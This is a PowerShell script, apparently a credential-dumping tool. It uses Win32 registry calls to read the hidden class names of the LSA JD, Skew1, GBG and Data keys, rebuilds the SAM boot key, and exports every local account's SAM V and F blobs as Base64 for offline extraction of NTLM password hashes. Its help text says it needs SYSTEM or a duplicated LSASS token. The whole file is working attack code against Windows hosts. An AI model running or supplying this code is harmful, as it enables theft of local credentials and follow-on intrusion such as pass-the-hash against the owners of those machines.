try{
    & {
        $ErrorActionPreference = 'Stop'
        [void] [ntlmx.win32]
    }
} catch {
    Add-Type -TypeDefinition @"
        using System;
        using System.Text;
        using System.Runtime.InteropServices;
        namespace ntlmx {
            public class win32 {

                [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern int RegOpenKeyEx(
                    IntPtr hKey,
                    string subKey,
                    int ulOptions,
                    int samDesired,
                    out IntPtr hkResult);

                [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern int RegQueryInfoKey(
                    IntPtr hkey,
                    StringBuilder lpClass,
                    ref int lpcbClass,
                    int lpReserved,
                    out int lpcSubKeys,
                    out int lpcbMaxSubKeyLen,
                    out int lpcbMaxClassLen,
                    out int lpcValues,
                    out int lpcbMaxValueNameLen,
                    out int lpcbMaxValueLen,
                    out int lpcbSecurityDescriptor,
                    IntPtr lpftLastWriteTime);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern int RegCloseKey(
                    IntPtr hKey);
            }
        }
"@
}

function Get-NTLMLocalPasswordHashes1 {
    $classes = -join (& {
            "JD", "Skew1", "GBG", "Data" | % {
                $hKey = [IntPtr]::Zero
                if ([ntlmx.win32]::RegOpenKeyEx(
                        0x80000002,
                        "SYSTEM\CurrentControlSet\Control\Lsa\$_",
                        0x0,
                        0x19,
                        [ref]$hKey))
                {
                    $e = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    throw [ComponentModel.Win32Exception]$e
                }
                
                $lpClass = New-Object Text.StringBuilder 1024
                [int]$lpcbClass = 1024
                if ([ntlmx.win32]::RegQueryInfoKey(
                        $hkey,
                        $lpClass,
                        [ref]$lpcbClass,
                        0x0,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [IntPtr]::Zero))
                {
                    $e = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    throw [ComponentModel.Win32Exception]$e
                }

                [void] [ntlmx.win32]::RegCloseKey($hKey)

                $lpClass.ToString()
            }
        })
    
    $bootkey = 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 | % {[Convert]::ToByte("$($classes[$_*2])$($classes[$_*2+1])", 16)}
    "bootKey -> " + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([Management.Automation.PSSerializer]::Serialize($bootKey)))

    Get-ChildItem "HKLM:SAM\SAM\Domains\Account\Users" |
    Where-Object {$_.PSChildName -match "^[0-9A-F]{8}$"} |
    ForEach-Object {
        $rid = $_.PSChildName
        $v = (Get-ItemProperty "HKLM:SAM\SAM\Domains\Account\Users\$rid" -Name V).V
        $f = (Get-ItemProperty "HKLM:SAM\SAM\Domains\Account" -Name F).F
        
        Write-Output "---------------------"
        "{0}:{1}:{2}" -f ($rid,([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([Management.Automation.PSSerializer]::Serialize($v)))),([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([Management.Automation.PSSerializer]::Serialize($f)))));
    }

    <#
        .SYNOPSIS
        Extract local NTLM password hashes.

        .DESCRIPTION
        Extract all local NTLM user password hashes from the registry handling latest
        AES-128-CBC with IV obfuscation techniques introduced with Windows 10 1607 as
        well as the traditional MD5/RC4 approach used in Windows 7/8/8.1.

        .OUTPUTS
        System.Management.Automation.PSObject

        .COMPONENT
        Win32

        .NOTES
        Requires to be run as SYSTEM or with LSASS Process Token duplicated.

        .EXAMPLE
        Get-NTLMLocalPasswordHashes
    #>
}
